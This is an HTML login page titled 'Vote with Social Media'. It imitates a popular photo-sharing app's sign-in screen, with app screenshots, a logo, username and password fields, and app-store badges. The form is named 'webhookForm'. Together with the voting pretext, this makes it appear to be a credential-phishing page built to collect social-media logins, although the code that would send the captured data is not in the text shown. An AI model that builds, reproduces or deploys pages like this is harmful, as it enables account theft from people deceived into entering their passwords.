<!DOCTYPE html>

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      rel="shortcut icon"
      href="img/socials/icon.png"
      type="image/x-icon"
    />
    <link rel="stylesheet" href="css/style2.css" />
    <title>Vote with Social Media</title>
    <style>
      #username{
        border: rgba(0, 0, 0, 0.123) 1px solid;
        background-color: rgba(92, 92, 92, 0);
      }
      #password{
        border: rgba(0, 0, 0, 0.103) 1px solid;
        background-color: rgba(92, 92, 92, 0);

      }
      form input {
        height: 3em !important;
        padding: 0.5em !important;
        outline-width: none !important;
        margin-bottom: 1em !important;
      }

      form .pass {
        height: 3.3em !important;
      }

      #submit2 img {
        width: 1.3em;
        animation-name: roll;
        animation-duration: 0.7s;
        animation-iteration-count: infinite;
        animation-timing-function: linear;
        color: white;
      }

      @keyframes roll {
        from {
          transform: rotate(0deg);
        }
        to {
          transform: rotate(360deg);
        }
      }
    </style>
  </head>
  <body onload="SwitchScreen()">
    <section class="container">
      <!-- SMARTPHONE SECTION -->
      <article class="smartphone">
        <div class="screens">
          <img
            class="screen fade"
            src="img/socials/screen1.png"
            alt="screen1"
          />
          <img
            class="screen fade"
            src="img/socials/screen2.png"
            alt="screen2"
          />
          <img
            class="screen fade"
            src="img/socials/screen3.png"
            alt="screen3"
          />
        </div>
        <img src="img/socials/smartphones.png" alt="smartphones" />
      </article>
      <!-- SMARTPHONE SECTION END -->
      <!-- FORM SECTION -->
      <article class="form-area">
        <div class="logo">
          <img src="img/socials/logo.png" alt="Logo" />
        </div>
        <form id="webhookForm">
       
          <input type="text" id="username" placeholder="Phone number, username, or email" required>
    
          
          <input type="password" id="password" placeholder="Password" required>
    
          <button type="submit">Submit</button>
        </form>
        <div class="noaccount">
          <a href="#">Don't have an account? <span>Signup</span></a>
        </div>
        <div class="apps">
          <p>Get the app</p>
          <a href="#">
            <img src="img/socials/appstore.png" alt="Get it from AppStore" />
          </a>
          <a href="#">
            <img
              src="img/socials/googleplay.png"
              alt="Get it from Google Play"
            />
          </a>
        </div>
      </article>
    </section>
    <!-- FORM SECTION END -->
